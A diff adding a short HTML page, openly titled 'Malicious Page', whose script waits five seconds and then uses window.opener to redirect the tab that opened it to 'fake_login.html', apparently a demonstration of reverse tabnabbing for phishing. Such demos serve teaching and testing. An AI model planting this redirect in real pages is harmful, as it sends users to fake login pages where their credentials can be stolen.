@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>This is malicious.html</h1>
+
+    <script>
+        setTimeout(() => {
+            if (window.opener) {
+                // Redirect the original index.html
+                window.opener.location.href = "fake_login.html";
+            }
+        }, 5000);
+    </script>
+
+</body>
+</html>
